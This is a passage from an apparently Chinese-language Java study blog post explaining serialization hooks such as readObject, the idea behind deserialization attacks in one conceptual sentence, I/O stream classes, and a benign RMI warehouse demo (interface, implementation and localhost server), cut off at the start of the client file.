class="comment">//序列化</span></span><br><span class="line">os.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">loadObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(SAVE_FILE));</span><br><span class="line">Object obj = ois.readObject();<span class="comment">//反序列化</span></span><br><span class="line">ois.close();</span><br><span class="line"><span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x07-如何利用-Java-反序列化进行攻击？"><a href="#0x07-如何利用-Java-反序列化进行攻击？" class="headerlink" title="0x07 如何利用 Java 反序列化进行攻击？"></a>0x07 如何利用 Java 反序列化进行攻击？</h2><p>在 PHP 和 Python 中在反序列化和序列化时都会有魔法方法进行调用。那 Java 中有哪些“魔法方法”？</p><ul><li><strong>writeObject</strong>：序列化时调用。</li><li>writeReplace：允许开发者提供一个替代对象来取代原来将被序列化的对象。</li><li>readObjectNoData：如果我们希望当接到的序列化流不满足我们想反序列化的类的时候，能自动进行一些状态初始化，那么我们就要提供 readObjectNoData 方法</li><li><strong>readObject</strong>：反序列化时调用。</li><li>readResolve：用来在反序列化的时候用你选择的对象来替代原本反序列化出来的对象。</li><li>validateObject：对某些字段进行校验，validateObject 方法会在我们在 readObject 方法里调用。</li></ul><p>常见的魔法方法为 writeObject 和 readObject，如果黑客将恶意代码嵌入 readObject 方法中，再将序列化后的代码发送给服务器，就会导致服务器在反序列化的过程中执行恶意代码。</p><blockquote><p>注意⚠️：反序列化时，由JVM直接构造出Java对象，不调用构造方法，构造方法内部的代码，在反序列化时根本不可能执行。  </p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * 自定义的序列化与反序列化操作</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Title</span> Defined_Serializable.java  </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Package</span> io_Opt  </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> flo@t</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2019年9月3日  </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> V1.0  </span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line"><span class="keyword">package</span> io_Opt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;serial&quot;)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> String brand;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> cost;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**   </span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> brand</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> cost</span></span><br><span class="line"><span class="comment">*/</span>  </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Car</span><span class="params">(String brand, <span class="keyword">int</span> cost)</span> </span>&#123;</span><br><span class="line"><span class="keyword">super</span>();</span><br><span class="line"><span class="keyword">this</span>.brand = brand;</span><br><span class="line"><span class="keyword">this</span>.cost = cost;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;品牌: &quot;</span> + brand + <span class="string">&quot;、售价: &quot;</span> + cost;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">in.defaultReadObject();</span><br><span class="line">System.out.println(<span class="string">&quot;Read Object Over&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">out.defaultWriteObject();</span><br><span class="line">System.out.println(<span class="string">&quot;Write Object Over&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * 进行自定义的Java序列化与反序列化</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@ClassName</span>: Baby_Serializable  </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: flo@t</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Defined_Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> File SAVE_FILE = <span class="keyword">new</span> File(<span class="string">&quot;serial.Car&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Title</span>: main  </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">Car car = <span class="keyword">new</span> Car(<span class="string">&quot;奔驰&quot;</span>, <span class="number">200000</span>);</span><br><span class="line"></span><br><span class="line">System.out.println(car.toString());</span><br><span class="line"></span><br><span class="line">saveObject(car);</span><br><span class="line"></span><br><span class="line">Car myCar = (Car) loadObject();</span><br><span class="line">System.out.println(myCar.toString());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">saveObject</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(SAVE_FILE));</span><br><span class="line">os.writeObject(obj);  <span class="comment">//序列化</span></span><br><span class="line">os.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">loadObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(SAVE_FILE));</span><br><span class="line">Object obj = ois.readObject();<span class="comment">//反序列化</span></span><br><span class="line">ois.close();</span><br><span class="line"><span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x08-File-对象和-ByteArrayOutputStream-对象的区别与联系"><a href="#0x08-File-对象和-ByteArrayOutputStream-对象的区别与联系" class="headerlink" title="0x08 File 对象和 ByteArrayOutputStream 对象的区别与联系"></a>0x08 File 对象和 ByteArrayOutputStream 对象的区别与联系</h2><p>在反序列化前，通常会创建 ByteArrayOutputStream 类或者 File 类来存储序列化后的数据。</p><p>ByteArrayOutputStream 是一种 Java 字节型输出流。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210327173652.png"><br>（图片说明：Java 中的 IO 流思维导图）</p><p>ByteArrayOutputStream 既然是输出流，为什么在运行时没有创建文件呢？我查看了一下这个类的源码，原来这个类在初始化时，创建了一个长度为 32 的 byte[] 数组。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210327174709.png"><br>（图片说明：ByteArrayOutputStream 的构造函数）</p><p>OutputStream 并非像文章《<a href="https://www.javazhiyin.com/46874.html">你真的会用Java io流吗？</a>》所说的那样：</p><blockquote><p>将数据从外存中读取到内存中的称为输入流，将数据从内存写入外存中的称为输出流。</p></blockquote><p>我认为输入流和输出流只相当于一个通道，输入流堵住了出口，输出流堵住了入口，和存储方式没有关系。（那篇文章挺通熟易懂的，建议阅读）输出流类可以作为一个二进制数组保存相关的数据作为中转。</p><p>File类是用来操作文件和目录的，主要是将二进制数据写入文件，真正保存二进制数据的是FileOutputStream类和ByteArrayOutputStream类。</p><h2 id="0x09-java中extends和implements的区别"><a href="#0x09-java中extends和implements的区别" class="headerlink" title="0x09 java中extends和implements的区别"></a>0x09 java中extends和implements的区别</h2><p>一个是继承，一个是实现接口。</p><p>继承这个可以理解为继承父类的方法，父类中的方法可以在子类中用到，super()。</p><p>实现接口就是在接口中定义了方法，这个方法要你自己去实现，接口可以看作一个标准，比如定义了一个动物的接口，它里面有吃（eat()）这个方法，你就可以实现这个方法implements，这个方法是自己写，可以是吃苹果，吃梨子，香蕉，或者其他的。IMPLEMENTS就是具体实现这个接口。</p><h1 id="2-网络编程"><a href="#2-网络编程" class="headerlink" title="2 网络编程"></a>2 网络编程</h1><h2 id="0x01-RMI-是什么？"><a href="#0x01-RMI-是什么？" class="headerlink" title="0x01 RMI 是什么？"></a>0x01 RMI 是什么？</h2><p>RMI 是 Remote Method Invocation 的缩写，也就是远程方法调用，是一种运行机制。</p><p>远程方法调用 RMI（Remote Method Invocation），是允许运行在一个Java 虚拟机的对象调用运行在另一个 Java 虚拟机上的对象的方法。 这两个虚拟机可以是运行在相同计算机上的不同进程中，也可以是运行在网络上的不同计算机中。</p><p>与 RMI 非常相似的还有 RPC（Remote Process Call），即远程过程调用。</p><ul><li>RMI：调用另一台计算机上 JVM 中的方法。只适用于 Java，无法跨语言。<strong>是 JDK 1.2 引入的一套 Java 自带 RPC 实现方案。</strong>。（简而言之，RMI 是一种 RPC）</li><li>RPC：调用另一台计算机上的服务（具体的程序）。是网络服务协议，与操作系统和语言无关。</li></ul><p>执行流程：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210325170241.png"></p><ul><li>Registry（注册表）是放置所有服务器对象的命名空间。 每次服务端创建一个对象时，它都会使用 bind() 或 rebind() 方法注册该对象。 这些是使用称为绑定名称的唯一名称注册的。</li><li>要调用远程对象，客户端需要该对象的引用。即通过服务端绑定的名称从注册表中获取对象（lookup() 方法。</li></ul><p>实现RMI：</p><ol><li>Warehouse.java<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Title</span>: Warehouse.java</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Package</span> warehouse</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: 仓库的远程接口。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> flo@t</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2019年8月25日</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> V1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@ClassName</span>: Warehouse</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: flo@t</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: 远程服务的接口定义中必须要继承Remote接口。这个接口中啥方法都没定义，应该是表示一种能力</span></span><br><span class="line"><span class="comment"> * 官方描述：</span></span><br><span class="line"><span class="comment"> *  ......Any object that is a remote object must directly or indirectly implement this interface.....</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Warehouse</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 用于查询指定商品的价格</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@Title</span>: getPrice</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@author</span>: flo@t</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@Description</span>:</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> description</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">   * <span class="doctag">@throws</span> RemoteException</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">double</span> <span class="title">getPrice</span><span class="params">(String description)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li>WarehouseImpl.java<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Title</span>: WarehouseImpl.java</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Package</span> warehouse</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: 服务器端来实现在远程接口中声明的工作。该类是远程方法调用的目标，因为扩展了UnicastRemoteObject类。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> flo@t</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2019年8月25日</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> V1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.*;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 实现 remote Warehouse的接口。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@ClassName</span>: WarehouseImpl</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: flo@t</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 补充：RMI的一个特点是服务的接口定义和其实现是分开的</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * UnicastRemoteObject类的定义：</span></span><br><span class="line"><span class="comment"> * public class UnicastRemoteObject extends RemoteServer</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * public abstract class RemoteServer extends RemoteObject</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * public abstract class RemoteObject implements Remote, java.io.Serializable</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;serial&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WarehouseImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">Warehouse</span> </span>&#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 定义一个键值对集合用于存放商品价格及其他信息</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">private</span> Map&lt;String, Double&gt; prices;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 构造方法</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@author</span> flo@t</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">WarehouseImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">    <span class="comment">//创建一个Map对象并存入存入数据</span></span><br><span class="line">    prices = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    prices.put(<span class="string">&quot;Toaster&quot;</span>, <span class="number">24.5</span>);</span><br><span class="line">    prices.put(<span class="string">&quot;water&quot;</span>, <span class="number">2.0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 接受用户要查询的商品的名称，返回商品的价格</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getPrice</span><span class="params">(String description)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">    Double price = prices.get(description);</span><br><span class="line">    <span class="keyword">return</span> price == <span class="keyword">null</span> ? <span class="number">0</span> : price;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li>WarehouseServer.java<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment">* <span class="doctag">@Title</span>: WarehouseServer.java  </span></span><br><span class="line"><span class="comment">* <span class="doctag">@Package</span> warehouse  </span></span><br><span class="line"><span class="comment">* <span class="doctag">@Description</span>: 直接构造并且注册一个WarehouseImpl对象</span></span><br><span class="line"><span class="comment">* <span class="doctag">@author</span> flo@t</span></span><br><span class="line"><span class="comment">* <span class="doctag">@date</span> 2019年8月25日  </span></span><br><span class="line"><span class="comment">* <span class="doctag">@version</span> V1.0  </span></span><br><span class="line"><span class="comment">*/</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment">* <span class="doctag">@ClassName</span>: WarehouseServer  </span></span><br><span class="line"><span class="comment">* <span class="doctag">@Description</span>: 实例化WarehouseImpl对象，并用naming service来将它注册，并等待客户端来调用</span></span><br><span class="line"><span class="comment">* <span class="doctag">@author</span>: flo@t</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WarehouseServer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * 使用LocateRegistry和Naming两个类来完成一个简单的RMI Demo</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Title</span>: main  </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> flo@t</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> args </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> RemoteException </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> NamingException </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">System.out.print(<span class="string">&quot;Constructing server implemention...&quot;</span>);</span><br><span class="line">WarehouseImpl centralWarehouse = <span class="keyword">new</span> WarehouseImpl();</span><br><span class="line">System.out.println(<span class="string">&quot;Ok&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * LocateRegistry is used to obtain a reference to a bootstrap</span></span><br><span class="line"><span class="comment"> * remote object registry on a particular host (including the local host), or</span></span><br><span class="line"><span class="comment"> * to create a remote object registry that accepts calls on a specific port.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建远程对象的注册表，指明其服务的端口。</span></span><br><span class="line">LocateRegistry.createRegistry(<span class="number">8888</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Sets the system property indicated by the specified key.设置系统属性</span></span><br><span class="line">System.setProperty(<span class="string">&quot;rmi:central_warehouse&quot;</span>, <span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line"><span class="comment">//这里前面的键值对的键名可以去掉&quot;rmi&quot;(实测)，为了区别还是加上吧</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//绑定远程对象到注册表，这里的&quot;rmi://&quot;必须要加上，提供一个URL来访问你的远程对象</span></span><br><span class="line">System.out.print(<span class="string">&quot;Binding server implemention to registry...&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//The Naming class provides methods for storing and obtaining references to remote objects in a remote object registry. </span></span><br><span class="line">Naming.bind(<span class="string">&quot;rmi://localhost:8888/central_warehouse&quot;</span>, centralWarehouse);</span><br><span class="line">System.out.println(<span class="string">&quot;Ok&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//等待客户端的连接</span></span><br><span class="line">System.out.println(<span class="string">&quot;waiting for invocations from clients&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;创建远程对象发生异常&quot;</span>);</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125; <span class="keyword">catch</span> (AlreadyBoundException e) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;发生重复绑定对象异常&quot;</span>);</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125; <span class="keyword">catch</span> (MalformedURLException e) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;发生URL畸形异常&quot;</span>);</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>WarehouseClient.java<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment">* <span class="doctag">@Title</span>: WarehouseClient.java  </span></span><br><span class="line"><span class="comment">* <span class="doctag">@Package</span> warehouse  </span></span><br><span class="line"><span class="comment">* <span class="doctag">@Description</span>: 